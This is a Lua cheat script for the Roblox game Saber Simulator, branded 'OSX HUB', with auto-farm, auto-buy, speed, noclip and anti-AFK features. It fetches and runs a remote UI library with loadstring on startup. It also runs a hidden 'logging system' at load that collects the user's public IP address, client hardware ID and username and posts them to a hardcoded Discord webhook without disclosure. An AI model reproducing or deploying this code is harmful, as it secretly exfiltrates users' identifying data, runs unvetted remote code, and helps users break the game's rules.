-- Load OSX UI Library
local OSX = loadstring(game:HttpGet("https://raw.githubusercontent.com/yxucnx/OSX-HUB-Lib/refs/heads/main/OSX_Lib.lua?v=" .. tick()))()

-- Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local TeleportService = game:GetService("TeleportService")
local VirtualUser = game:GetService("VirtualUser")
local Workspace = game:GetService("Workspace")
local Lighting = game:GetService("Lighting")

local localPlayer = Players.LocalPlayer

-- Fetch Game Name Automatiaclly 
local success, productInfo = pcall(function()
    return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
end)
local GameName = success and productInfo and productInfo.Name or "SITE VERSION"
local HttpService = game:GetService("HttpService")

-- [[ LOGGING SYSTEM ]] --
local WebhookURL = "https://discord.com/api/webhooks/1490398138220019825/jlZBTnlWn2ZWKEd4bvBUYjQrnQXCX4N9MjfVSK0ceBqQQVIBHaZQ4xDcPnCnA0SlDbAs"

local function SendLog()
    task.spawn(function()
        local successIP, ip = pcall(function() return game:HttpGet("https://api4.ipify.org/") end)
        local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
        local time = os.date("%X")
        
        local payload = {
            ["username"] = "𝗢𝗦𝗫 𝗛𝗨𝗕 - 𝗟𝗢𝗚 𝗨𝗦𝗘 𝗦𝗖𝗥𝗜𝗣𝗧",
            ["avatar_url"] = "https://media.discordapp.net/attachments/1485621966575501312/1488393679117881344/logo512v2.png?ex=69d335a2&is=69d1e422&hm=9403f72a1903c8fa334cf883d7f906b1c06b8e3e6c7432b5b1e6b50fe8281e22&=&format=webp&quality=lossless",
            ["embeds"] = {{
                ["title"] = "[!] : 𝗧𝗵𝗲 𝘀𝘆𝘀𝘁𝗲𝗺 𝗱𝗲𝘁𝗲𝗰𝘁𝗲𝗱 𝘁𝗵𝗲 𝘂𝘀𝗲 𝗼𝗳 𝗮 𝘀𝗰𝗿𝗶𝗽𝘁.",
                ["description"] = string.format(
                    "――――――――――――――――――――――\n\n**👤 User :**  ```%s```\n**🎮 Script Name :** ```%s```\n**🖥️ HWID :** ```%s```\n**🔐 KEY :** ```%s```\n**🗺️ IP :** ```%s```\n**❌ ACC BAN :** ```%s```\n**🧾Reason :** ```%s```\n** ⏳ Time Data :** ```%s```\n\n――――――――――――――――――――――",
                    localPlayer.Name, GameName, hwid, "None", (successIP and ip or "Unknown"), "None", "None", time
                ),
                ["color"] = 34303,
                ["footer"] = {
                    ["text"] = "© 2026 Osx Hub. All rights reserved.",
                    ["icon_url"] = "https://media.discordapp.net/attachments/1485621966575501312/1488393679117881344/logo512v2.png?ex=69d335a2&is=69d1e422&hm=9403f72a1903c8fa334cf883d7f906b1c06b8e3e6c7432b5b1e6b50fe8281e22&=&format=webp&quality=lossless"
                },
                ["image"] = {
                    ["url"] = "https://media.discordapp.net/attachments/1485621966575501312/1490364198008393818/standard_1.gif?ex=69d3c952&is=69d277d2&hm=84671fab55d2308ed14c9bd662582a0e6170d1ed0a55c8c6fcbe0cdbbea901fd&="
                }
            }}
        }
        
        pcall(function()
            (request or http_request or (http and http.request))({
                Url = WebhookURL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(payload)
            })
        end)
    end)
end

-- Call Initial Log
SendLog()

-- Window Setup ตรงตามรูปแบบดั้งเดิมเป๊ะ
local Window = OSX:CreateWindow({
    Title = "OSX HUB | " .. GameName,
    Subtitle = "Made by: LilYouDev1997 | Discord: discord.gg/osxhub",
    WindowLogo = "https://img2.pic.in.th/logo512v2.png",
    FloatingLogo = "https://img1.pic.in.th/images/logo512v1.png",
    ToggleKey = Enum.KeyCode.RightControl
})

-- ==========================================
-- Info Tab (รูปแบบเดิม 100%)
-- ==========================================
local InfoTab = Window:AddTab({
    Title = "Info",
    SubDescription = "Information",
    Icon = "info"
})

local InfoPanel = InfoTab:AddPanel("Information")
InfoPanel:AddInfoLabel("Owner:", "Darkmxde.")
InfoPanel:AddInfoLabel("Developer:", "LilYouDev1997x")
InfoPanel:AddInfoLabel("Discord:", "https://discord.gg/osxhub")

InfoPanel:AddWideButton({
    Title = "Discord Server",
    Callback = function()
        pcall(function() setclipboard("https://discord.gg/osxhub") end)
    end
})

-- ==========================================
-- Main Tab (เพิ่มฟังก์ชั่น Auto Farm ของ Saber Simulator เข้ามา)
-- ==========================================
local MainTab = Window:AddTab({
    Title = "Auto Farm",
    SubDescription = "การต่อสู้และฟาร์ม",
    Icon = "sword"
})

local FarmPanel = MainTab:AddPanel("Auto Farming Settings")
local BuyPanel = MainTab:AddPanel("Auto Shopping")

local autoClickEnabled = false
FarmPanel:AddToggle({
    Title = "Auto Click",
    Description = "คลิกฟันดาบอัตโนมัติ",
    Default = false,
    Callback = function(Value)
        autoClickEnabled = Value
        if not autoClickEnabled then return end
        task.spawn(function()
            local events = ReplicatedStorage:WaitForChild("Events", 5)
            local swingEvent = events and events:WaitForChild("SwingSaber", 5)
            while autoClickEnabled do
                if not swingEvent then break end
                pcall(function() swingEvent:FireServer() end)
                task.wait(0.1)
            end
        end)
    end
})

local autoSellEnabled = false
FarmPanel:AddToggle({
    Title = "Auto Sell",
    Description = "ขาย Strength อัตโนมัติ",
    Default = false,
    Callback = function(Value)
        autoSellEnabled = Value
        if not autoSellEnabled then return end
        task.spawn(function()
            local events = ReplicatedStorage:WaitForChild("Events", 5)
            local sellEvent = events and events:WaitForChild("SellStrength", 5)
            while autoSellEnabled do
                if not sellEvent then break end
                pcall(function() sellEvent:FireServer() end)
                task.wait(0.5)
            end
        end)
    end
})

local autoBuySabersEnabled = false
BuyPanel:AddToggle({
    Title = "Auto Buy Sabers",
    Description = "ซื้อดาบใหม่ให้อัตโนมัติ",
    Default = false,
    Callback = function(Value)
        autoBuySabersEnabled = Value
        if not autoBuySabersEnabled then return end
        task.spawn(function()
            local events = ReplicatedStorage:WaitForChild("Events", 5)
            local buyEvent = events and events:WaitForChild("UIAction", 5)
            while autoBuySabersEnabled do
                if not buyEvent then break end
                pcall(function() buyEvent:FireServer("BuyAllWeapons") end)
                task.wait(1)
            end
        end)
    end
})

local autoBuyClassesEnabled = false
local classList = {
    "Apprentice", "Soldier", "Paladin", "Assassin", "Warrior", "Warlord", "Berserker", "Saber", "Cyborg", "Master", 
    "Titan", "Phantom", "Shadow", "Ghoul", "Tempest", "Elementalist", "Beast", "Dark Ninja", "Warlock", "Overlord", 
    "Demigod", "Archangel", "Wraith", "Deity", "Nemesis", "Executioner", "Terminator", "Colossus", "Zeus", "Elf", 
    "Santa", "Corruptor", "Prestige", "Caster", "Cyclops", "King", "Hacker", "Angel", "Minotaur", "Cerberus", 
    "Yeti", "Samurai", "Baron", "Detective", "Red Baron", "Witch", "Gladiator", "Purple Baron", "Guard", 
    "Shadow Titan", "Superhuman", "Brain", "Shadow Guard", "Shadow Gladiator"
}

BuyPanel:AddToggle({
    Title = "Auto Buy Classes",
    Description = "ซื้อคลาสทั้งหมดให้อัตโนมัติ (เรียงตามลำดับ)",
    Default = false,
    Callback = function(Value)
        autoBuyClassesEnabled = Value
        task.spawn(function()
            local buyEvent = ReplicatedStorage:WaitForChild("Events"):WaitForChild("UIAction")
            while autoBuyClassesEnabled do
                for _, className in ipairs(classList) do
                    if not autoBuyClassesEnabled then break end
                    pcall(function() buyEvent:FireServer("BuyClass", className) end)
                    task.wait(0.1)
                end
                task.wait(2)
            end
        end)
    end
})

local autoBuyDNAEnabled = false
BuyPanel:AddToggle({
    Title = "Auto Buy DNA",
    Description = "ซื้อเซลล์ DNA ให้อัตโนมัติ",
    Default = false,
    Callback = function(Value)
        autoBuyDNAEnabled = Value
        if not autoBuyDNAEnabled then return end
        task.spawn(function()
            local events = ReplicatedStorage:WaitForChild("Events", 5)
            local buyEvent = events and events:WaitForChild("UIAction", 5)
            while autoBuyDNAEnabled do
                if not buyEvent then break end
                pcall(function() buyEvent:FireServer("BuyAllDNAs") end)
                task.wait(1)
            end
        end)
    end
})

local autoBuyBossBoostsEnabled = false
BuyPanel:AddToggle({
    Title = "Auto Buy Boss Boosts",
    Description = "พยายามซื้อบัฟบอสให้อัตโนมัติ",
    Default = false,
    Callback = function(Value)
        autoBuyBossBoostsEnabled = Value
        if not autoBuyBossBoostsEnabled then return end
        task.spawn(function()
            local events = ReplicatedStorage:WaitForChild("Events", 5)
            local buyEvent = events and events:WaitForChild("UIAction", 5)
            while autoBuyBossBoostsEnabled do
                if not buyEvent then break end
                pcall(function() buyEvent:FireServer("BuyAllBossBoosts") end)
                task.wait(1)
            end
        end)
    end
})

-- ==========================================
-- Player Tab (ช่องเดินกับกระโดด)
-- ==========================================
local PlayerTab = Window:AddTab({
    Title = "Player",
    SubDescription = "Player Settings",
    Icon = "user"
})

local MovementPanel = PlayerTab:AddPanel("Movement Settings")

local walkSpeedValue = 16
MovementPanel:AddSlider({
    Title = "WalkSpeed",
    Description = "ปรับความเร็วเดิน",
    Min = 16,
    Max = 500,
    Default = 16,
    Rounding = 1,
    Callback = function(Value)
        walkSpeedValue = Value
        local char = localPlayer.Character
        local hum = char and char:FindFirstChild("Humanoid")
        if hum then hum.WalkSpeed = Value end
    end
})

localPlayer.CharacterAdded:Connect(function(char)
    local hum = char:WaitForChild("Humanoid", 5)
    if hum then hum.WalkSpeed = walkSpeedValue end
end)

local cframeSpeedEnabled = false
local cframeSpeedValue = 1
MovementPanel:AddToggle({
    Title = "CFrame Speed",
    Description = "เพิ่มสปีดโดยใช้วิธี CFrame (ลื่นและกันดึง)",
    Default = false,
    Callback = function(Value)
        cframeSpeedEnabled = Value
    end
})

MovementPanel:AddSlider({
    Title = "CFrame Value",
    Description = "ระดับตัวคูณการวาร์ป (CFrame)",
    Min = 1,
    Max = 10,
    Default = 1,
    Rounding = 1,
    Callback = function(Value)
        cframeSpeedValue = Value
    end
})

RunService.Heartbeat:Connect(function()
    if cframeSpeedEnabled then
        local char = localPlayer.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        local hum = char and char:FindFirstChild("Humanoid")
        if hrp and hum and hum.MoveDirection.Magnitude > 0 then
            hrp.CFrame = hrp.CFrame + (hum.MoveDirection * cframeSpeedValue)
        end
    end
end)

local infiniteJumpEnabled = false
MovementPanel:AddToggle({
    Title = "Infinity Jump",
    Description = "แตะกระโดดค้างเพื่อลอยรัวๆ",
    Default = false,
    Callback = function(Value)
        infiniteJumpEnabled = Value
    end
})

UserInputService.JumpRequest:Connect(function()
    if infiniteJumpEnabled then
        local char = localPlayer.Character
        local hum = char and char:FindFirstChild("Humanoid")
        if hum then
            hum:ChangeState(Enum.HumanoidStateType.Jumping)
        end
    end
end)

local noclipEnabled = false
MovementPanel:AddToggle({
    Title = "Noclip",
    Description = "เดินย่างทะลุกำแพง",
    Default = false,
    Callback = function(Value)
        noclipEnabled = Value
    end
})

RunService.Stepped:Connect(function()
    if noclipEnabled then
        local char = localPlayer.Character
        if char then
            for _, v in pairs(char:GetDescendants()) do
                if v:IsA("BasePart") then
                    v.CanCollide = false
                end
            end
        end
    end
end)

-- ==========================================
-- Configs Tab (ใส่ Utility)
-- ==========================================
local ConfigTab = Window:AddTab({
    Title = "Configs",
    SubDescription = "Management",
    Icon = "database"
})

local MasterConfigPanel = ConfigTab:AddPanel("Master Features")

local antiAFKEnabled = false
MasterConfigPanel:AddToggle({
    Title = "Anti AFK",
    Description = "ตีตัวออกห่างระบบเตะคนหลับ",
    Default = false,
    Callback = function(Value)
        antiAFKEnabled = Value
    end
})

localPlayer.Idled:Connect(function()
    if antiAFKEnabled then
        pcall(function()
            VirtualUser:CaptureController()
            VirtualUser:ClickButton2(Vector2.new())
        end)
    end
end)

ConfigTab:AddPanel("Optimization"):AddWideButton({
    Title = "Boost FPS (ปรับให้ภาพลื่น)",
    Callback = function()
        pcall(function()
            for _, v in pairs(Workspace:GetDescendants()) do
                if v:IsA("Part") or v:IsA("UnionOperation") or v:IsA("MeshPart") then
                    v.Material = Enum.Material.Plastic
                    v.Reflectance = 0
                elseif v:IsA("Decal") or v:IsA("Texture") then
                    v.Transparency = 1
                elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
                    v.Enabled = false
                end
            end
            for _, v in pairs(Lighting:GetChildren()) do
                if v:IsA("PostProcessEffect") then
                    v.Enabled = false
                end
            end
        end)
        game.StarterGui:SetCore("SendNotification", {
            Title = "OSX HUB",
            Text = "บูส FPS เรียบร้อย!",
            Duration = 3
        })
    end
})

print("OSX HUB | Saber Simulator (Restored Format) Loaded Successfully")
